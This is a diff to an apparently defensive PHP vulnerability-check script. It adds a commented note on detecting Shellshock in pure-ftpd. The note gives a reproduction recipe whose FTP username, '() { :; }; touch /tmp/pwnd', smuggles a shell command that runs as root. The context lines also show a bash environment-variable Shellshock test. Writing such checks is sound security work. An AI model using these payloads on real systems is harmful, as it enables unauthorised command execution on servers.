@@ -337,5 +337,35 @@ else if(function_exists('shell_exec')){shell_exec("unset var");}
 
 //Test From bash [AFFEDTED]
 //env var='() { :;};touch ShellShockExploit.vulnerable' /bin/bash -c /bin/true
+
+
+/*
+
+todo add pure FTP exploit check ==>
+
+$ cat > /tmp/handler.sh
+#! /bin/bash
+echo auth_ok:1
+echo uid:42
+echo gid:21
+echo dir:/tmp
+echo end
+^D
+ 
+$ chmod +x /tmp/handler.sh
+ 
+# pure-authd -B -s /tmp/ftpd.sock -r /tmp/handler.sh
+ 
+# pure-ftpd -B -l extauth:/tmp/ftpd.sock
+ 
+$ ftp 127.0.0.1
+Name: () { :; }; touch /tmp/pwnd
+Password: whatever
+^C
+ 
+$ ls -l /tmp/pwnd
+-rw-------  1 root  wheel  0 Sep 27 15:28 /tmp/pwnd
+*/
+
 /*----------------------------------------*/
 ?>
